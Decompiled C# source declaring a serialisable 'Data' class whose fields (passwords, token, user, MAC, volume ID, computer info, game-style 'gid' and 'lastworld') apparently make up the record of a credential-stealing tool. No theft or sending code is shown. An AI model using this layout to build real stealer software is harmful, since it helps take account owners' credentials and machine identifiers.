using System;
using System.Runtime.Serialization;

namespace Trash
{
	// Token: 0x02000006 RID: 6
	[DataContract]
	internal class Data
	{
		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000027 RID: 39 RVA: 0x000021ED File Offset: 0x000003ED
		// (set) Token: 0x06000028 RID: 40 RVA: 0x000021F5 File Offset: 0x000003F5
		[DataMember]
		public string gid { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000029 RID: 41 RVA: 0x000021FE File Offset: 0x000003FE
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002206 File Offset: 0x00000406
		[DataMember]
		public string passwords { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600002B RID: 43 RVA: 0x0000220F File Offset: 0x0000040F
		// (set) Token: 0x0600002C RID: 44 RVA: 0x00002217 File Offset: 0x00000417
		[DataMember]
		public string volid { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600002D RID: 45 RVA: 0x00002220 File Offset: 0x00000420
		// (set) Token: 0x0600002E RID: 46 RVA: 0x00002228 File Offset: 0x00000428
		[DataMember]
		public string MAC { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600002F RID: 47 RVA: 0x00002231 File Offset: 0x00000431
		// (set) Token: 0x06000030 RID: 48 RVA: 0x00002239 File Offset: 0x00000439
		[DataMember]
		public string computerInfo { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000031 RID: 49 RVA: 0x00002242 File Offset: 0x00000442
		// (set) Token: 0x06000032 RID: 50 RVA: 0x0000224A File Offset: 0x0000044A
		[DataMember]
		public string lastworld { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000033 RID: 51 RVA: 0x00002253 File Offset: 0x00000453
		// (set) Token: 0x06000034 RID: 52 RVA: 0x0000225B File Offset: 0x0000045B
		[DataMember]
		public string user { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000035 RID: 53 RVA: 0x00002264 File Offset: 0x00000464
		// (set) Token: 0x06000036 RID: 54 RVA: 0x0000226C File Offset: 0x0000046C
		[DataMember]
		public string token { get; set; }
	}
}
